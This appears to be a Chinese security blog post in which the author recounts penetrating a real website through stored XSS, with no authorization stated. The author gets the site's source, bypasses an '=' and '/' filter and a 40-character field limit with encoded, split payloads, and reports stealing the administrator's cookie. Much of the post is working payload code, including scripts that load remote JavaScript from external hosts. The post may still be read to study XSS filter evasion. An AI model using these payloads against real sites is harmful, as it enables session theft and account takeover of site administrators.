##

  

作者：青空酱 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

  
  

![image.png](https://image.3001.net/images/20190808/1565228032_5d4b7c0077737.png!small)  

 **序言**

实战渗透某站点时遇到的，经过几天研究最终成功绕过限制并打到管理员cookie，特此记录下备忘。将一些琐碎的trick和知识点进行了有机结合与综合实践，希望本文能对读者有所帮助，若有谬误，还请指正。

![image.png](https://image.3001.net/images/20190808/1565228056_5d4b7c18b9fb2.png!small)

 **准备工作**

 **  
**

首先看看站点，事先测过了SQL等漏洞，这里只测试XSS。

![image.png](https://image.3001.net/images/20190808/1565228080_5d4b7c301c54d.png!small)  

先尝试填充一些正常数据以判断是否会回显payload，经过测试，该站点提交信息会直接跳转回首页，无法查看payload解析执行情况。

注意：测试xss时往往不要一上来就怼<script>/:..等危险字符，有暴露渗透行为的风险且难以控制页面显示情况。

看不到回显难道就要盲打嘛？

这里提供一个思路： **尝试获取该系统的源码并本地搭建进行测试。**

好的，既然思路明确了，我们就尝试去获取该系统的源码。

  1. 扫描敏感目录及文件，查看是否存在.git / .svn等代码工程文件，如果存在的话，是 可以直接通过该敏感文件还原出系统源码的。

相关工具:<https://github.com/lijiejie/GitHack>

Seay-svn 还原工具，大家可以自行下载

  1. 从源码本身着手，寻找版权相关信息，之后去网上寻找并下载源码。

渗透该站时便使用了方法2，尝试访问后台时网页便爆出了我们想要的信息。

![image.png](https://image.3001.net/images/20190808/1565228096_5d4b7c40c3eb5.png!small)  

搜索相关源码并下载，成功在本地搭建。

![image.png](https://image.3001.net/images/20190808/1565228109_5d4b7c4d0ae61.png!small)  

好了，这样我们就可以放心测试xss了。(本地你想怎么怼都不会有风险的)，关于XSS的学习，可以到合天网安实验室学习渗透XSS漏洞原理和利用，点击“[实验:渗透XSS漏洞原理和利用(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017042715503800001)”可操作学习。

![image.png](https://image.3001.net/images/20190808/1565228116_5d4b7c54eaf09.png!small)

  
  

![image.png](https://image.3001.net/images/20190808/1565228137_5d4b7c691bee4.png!small)  

 **好戏开演**  

准备好payload:

<script src="<http://x.co/qwq>"></script>

这里推荐一个网站缩短服务：

 **x.co**

访问设置url即可

![image.png](https://image.3001.net/images/20190808/1565228144_5d4b7c70c62db.png!small)  

要是有更短的网址缩短服务可以留言分享下，毕竟在测试xss中有时仅仅缩短一个字符便能决定渗透成功与否。

提交payload后我们到后台查看效果。

![image.png](https://image.3001.net/images/20190808/1565228151_5d4b7c7769116.png!small)  

对比一下:

    
    
    <script src="http://x.co/qwq"></script><script src"http:  x.co  qwq"></script>

可以发现= 与url中的‘/’被过滤掉  

并且页面解析了我们的<script>标签

这里有个技巧：

使用chrome等浏览器的开发者工具查看源代码时，如果标签是彩色的，说明被解析了，如果是黑色的，则标签已被转义而不是解析。

那么我们便来考虑如何绕过限制。

  1. 使用其他不包含= / 的标签进行xss

  2. 编码绕过

先从思路1入手：

”=”符合常见于属性处，而绝大多数xsspayload所运用的便是标签的属性，想找到一个不使用”=”的标签并不容易。

但是还是存在几个特例的

    
    
    <script>document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,104,116,116,112,58,47,47,120,46,99,111,47,120,105,72,118,62,60,47,115,99,114,105,112,116,62));</script>        ascii编码绕过<script>eval(Dec('203041263543203','2549'));</script><STYLE>@im\port'\ja\vasc\ript:alert("X3SS")';</STYLE>.....

  

其实这里就已经结合了编码绕过的思路，故不再赘述编码绕过  

我们这里使用第一个payload,该payload完美的绕过了“=”与“/”的限制，因为特殊符号全被编码成了对应的ascii码

提交payload,到后台查看效果

![image.png](https://image.3001.net/images/20190808/1565228159_5d4b7c7f40cab.png!small)  

显然，我们的payload执行成功。

你以为这样就完了吗？？

我们现在去目标站测试下

![image.png](https://image.3001.net/images/20190808/1565228165_5d4b7c856528a.png!small)  

再看看payload的长度

![image.png](https://image.3001.net/images/20190808/1565228170_5d4b7c8ad0e7f.png!small)  

![image.png](https://image.3001.net/images/20190808/1565228178_5d4b7c925fef9.png!small)  

所以好戏才刚刚开始啊...

也许有读者会问为什么同样的payload却遇到了限制呢？

这点可以在管理后台获得解答。![image.png](https://image.3001.net/images/20190808/1565228183_5d4b7c97ddb4c.png!small)

说明目标站的数据项做了长度限制。经过测试，目标站所有的数据项长度都被限制到了40个字符，那么我们来考虑绕过。

这里提供一种巧妙的思路： **将** **payload** **分割起来并储存在相应的变量中，拼接变量后执行。**

所用的payload一般为：

    
    
    <script>z='document.'</script>  <script>z=z+'write("'</script>  <script>z=z+'<script'</script>  <script>z=z+' src=ht'</script>  <script>z=z+'tp://xx'</script>  <script>z=z+'x.shell'</script>  <script>z=z+'.net/1.'</script>  <script>z=z+'js></sc'</script>  <script>z=z+'ript>")'</script>  <script>eval_r(z)</script>

  

注：此payload要求所有字符注入进同一页面。

思路确定了，但是对于目标系统来说，该如何绕过’=’与’/’的限制呢？

之前提过，使用编码绕过特殊字符是一座较为有效的思路，那么我们便考虑将分割注入与编码这两种思路相结合。

 **补充知识：**

Unicode编码绕过

    
    
    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#120;&#115;&#115;&#34;&#41;&#59;"><img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">

url编码绕过

    
    
    <img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%22%78%73%73%22%29%3b'))"><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

Ascii码绕过

    
    
    <img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">

  

hex绕过

    
    
    <imgsrc=xonerror=eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')>

八进制

    
    
    <imgsrc=x onerror=alert('\170\163\163')>

base64绕过

    
    
    <imgsrc="x"onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw=='))"><iframesrc="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">

通过观察我们可以发现，url编码，ascii编码，base64编码后的字符在执行时需要相应函数或方法进行解码，无疑增加了payload的长度，反而在整体长度有限制的情况下不利于执行。

那么有没有一种可被直接解析并且编码后长度适中的编码方式呢？

有！

 **hex** **编码** **8** **进制** **unicode** **编码！**

以unicode编码为例(原理与hex,8进制大同小异，有兴趣的读者可以自行测试)

我们先将’=’替换掉

    
    
    <script>eval(z\u003d'document.')</script><script>eval(z\u003dz+'write("')</script><script>eval(z\u003dz+'<script')</script><script>eval(z\u003dz+'src=ht')</script><script>eval(z\u003dz+'tp://xx')</script><script>eval(z\u003dz+'x.shell')</script><script>eval(z\u003dz+'.net/1.')</script><script>eval(z\u003dz+'js></sc')</script><script>eval(z\u003dz+'ript>")')</script><script>eval_r(z)</script>

  

注：

  1. 使用unicode,hex,8进制等编码时需要用到eval()函数

  2. 其实这里的payload并不可用，还需要经过处理，只是为了展现思路历程

下一步处理一些细节：

  1. eval内的引号需要转义

  2. 进一步的缩短payload

请大家思考：

只用一个变量z进行存储，在之后的每一步中拼接字符串是否为最优的方法？

个人认为，在总长度允许的情况下，可以将不同的payload存储在不同的变量中，

例如：

    
    
    <script>eval('a\u003d\'docu\'')</script><script>eval('b\u003d\'ment\'')</script><script>eval('c\u003d\'.wri\'')</script><script>eval('d\u003d\'te("\'')</script><script>eval('e\u003d\'<scr\'')</script>

这样便可以省去”z+”这两个字符

最后进行拼接

    
    
    <script>eval('z\u003da+b+c+d+e')</script>

拼接字符时只是单纯的变量加减，并不需要转义等复杂操作增添新的字符，payload的长度还在可以接受的范围内。  

如果读者对整个过程存在疑问，推荐自己写一个过滤掉“=”与url中“/”的环境进行测试，能帮助你更好的理解本文。

贴一下最终的payload:

    
    
    <script>eval('a\u003d\'docu\'')</script><script>eval('b\u003d\'ment\'')</script><script>eval('c\u003d\'.wri\'')</script><script>eval('d\u003d\'te("\'')</script><script>eval('e\u003d\'<scr\'')</script><script>eval('f\u003d\'ipt\'')</script><script>eval('g\u003d\'src\'')</script><script>eval('p\x3d\'\x3d\'')</script><script>eval('h\u003d\'http\'')</script><script>eval('i\u003d\'://x\'')</script><script>eval('j\u003d\'.co/\'')</script><script>eval('k\u003d\'6nx2\'')</script><script>eval('l\u003d\'r></\'')</script><script>eval('m\u003d\'scri\'')</script><script>eval('n\u003d\'pt>"\'')</script><script>eval('o\u003d\')\'')</script><script>eval('z\x3da+b+c+d+e')</script><script>eval('z\x3dz+f+g+p+h')</script><script>eval('z\x3dz+i+j+k+l')</script><script>eval('z\x3dz+m+n+o')</script><script>eval(eval('z'))</script>

  

你以为这样就完了吗？不！还没完！

我们提交下该payload

![image.png](https://image.3001.net/images/20190808/1565228193_5d4b7ca1b3dc5.png!small)  

![image.png](https://image.3001.net/images/20190808/1565228199_5d4b7ca74b561.png!small)  

为什么会报错某些变量没有被定义呢？

我们的payload在本地chrome测试是完美成功的啊

不应该存在语法上的错误啊

这就要讲到另一个知识点了：

原来JS引擎并非一行行去分析和执行程序，而是一段一段的执行(如3),而且在同一段程序的分析执行中，定义式的函数语句会被优先执行。函数定义执行完以后才会按顺序执行其他语句代码。

在经过预处理后，js引擎才会从上到下依次执行。

想想我们的注入顺序？

    
    
    <script>eval('a\u003d\'docu\'')</script><script>eval('b\u003d\'ment\'')</script><script>eval('c\u003d\'.wri\'')</script><script>eval('d\u003d\'te("\'')</script><script>eval('e\u003d\'<scr\'')</script><script>eval('f\u003d\'ipt\'')</script><script>eval('g\u003d\'src\'')</script><script>eval('p\x3d\'\x3d\'')</script><script>eval('h\u003d\'http\'')</script><script>eval('i\u003d\'://x\'')</script><script>eval('j\u003d\'.co/\'')</script><script>eval('k\u003d\'6nx2\'')</script><script>eval('l\u003d\'r></\'')</script><script>eval('m\u003d\'scri\'')</script><script>eval('n\u003d\'pt>"\'')</script><script>eval('o\u003d\')\'')</script><script>eval('z\x3da+b+c+d+e')</script><script>eval('z\x3dz+f+g+p+h')</script><script>eval('z\x3dz+i+j+k+l')</script><script>eval('z\x3dz+m+n+o')</script><script>eval(eval('z'))</script>

  

![image.png](https://image.3001.net/images/20190808/1565228204_5d4b7cac6643e.png!small)  

最终执行变量的语句却放在了页面上端，js引擎在执行时自然会报错。

所以把之前的payload倒序注入即可。(相信我这真的是最后一次了)

成功打到cookie.

![image.png](https://image.3001.net/images/20190808/1565228209_5d4b7cb1ceac8.png!small)  

![image.png](https://image.3001.net/images/20190808/1565228214_5d4b7cb6d4b2e.png!small)  

 **后话**  

一次曲折的XSS测试完成了，自己也学到了一些技巧与思路，记录下来做个总结。很多时候在复杂的环境下单单一种思路是无法成功渗透的，需要自己摸索结合多种思路与技巧，将之结合，打出一套“组合拳”，方能取胜。XSS这块有很多细节需要注意与理解，想要透彻理解本文的话最好还是自己搭建环境动手操作下，希望本文能带给读者一些绵薄的帮助。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关，本文为合天原创，如需转载，请注明出处！  

